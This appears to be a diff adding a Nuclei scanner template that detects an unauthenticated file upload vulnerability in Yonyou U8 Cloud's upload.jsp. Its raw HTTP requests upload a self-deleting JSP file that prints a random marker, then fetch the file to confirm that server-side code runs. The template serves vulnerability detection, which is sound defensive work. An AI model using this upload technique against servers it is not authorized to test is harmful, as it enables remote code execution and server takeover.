@@ -1,0 +1,45 @@
+id: uf-u8-cloud-upload-file-vulnerability
+info:
+  name: UF U8 Cloud upload.jsp File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    yonyou U8 cloud is a cloud ERP developed by yonyou. There is a file upload vulnerability in yonyou U8 upload.jsp, which can be exploited by attackers to gain server privileges.
+  tags: file-upload
+  classification:
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        POST /linux/pages/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        filename: {{random_hex_16}}.jsp
+
+        <% out.println("{{random_hex_16}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{random_hex_16}}"
+
+  - raw:
+      - |
+        GET /linux/{{random_hex_16}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{random_hex_16}}"
+variables:
+  random_hex_16: "{{rand_text_alphanumeric(16)}}"
